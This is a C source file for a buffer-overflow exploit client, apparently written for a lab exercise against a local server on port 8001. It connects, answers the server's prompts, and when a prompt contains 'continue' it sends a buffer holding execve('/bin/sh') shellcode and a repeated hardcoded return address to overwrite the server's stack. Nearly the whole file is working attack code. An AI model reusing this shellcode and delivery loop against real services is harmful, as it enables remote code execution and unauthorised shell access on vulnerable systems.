#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define BUFFER_SIZE 48
#define ADDR 0xb7dc3330
#define	PORTNUM	8001
#define	BLENGTH	64
#define	ALENGTH	32
/*
0xeb	0x12	0x5e	0x31	0xc0	0x88	0x46	0x07
0x50	0x56	0x31	0xd2	0x89	0xe1	0x89	0xf3
0xb0	0x0b	0xcd	0x80	0xe8	0xe9	0xff	0xff
0xff	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68
*/


static char shellcode[] =
"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68"
"\x30\x33\xdc\xb7\x30\x33\xdc\xb7"
"\x30\x33\xdc\xb7\x30\x33\xdc\xb7";   


static void
loop(int s)
{
  char buffer[BLENGTH];
  char name[ALENGTH] = "Jimmy";
  //get the mallious
  unsigned int bytes;
  char  *code; 
   bytes = BUFFER_SIZE + 1;
    code = calloc(bytes, 1);
    if (code ==NULL) {
        perror("malloc()");
        exit(EXIT_FAILURE);
    }
   //memset((void *)code, NOP, 8);
   memcpy(code, shellcode, strlen(shellcode));
    
  /* Send name to server */
  send(s, name, ALENGTH, 0);
for (;;) {

    /* Receive prompt */
    if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
      break;
    }

    /* Display prompt */
    fputs(buffer, stdout);
    
    if(strstr(buffer, "continue") != NULL){
        strcpy(buffer, code);
    }
    else{
        /* Read user response */
        strcpy(buffer, "1\n");
    }
    /* Send user response */
    send(s, (void *)buffer, BLENGTH, 0);
  }
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }
/* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }
/* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);
 /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
  close(s);

  return (0);
}
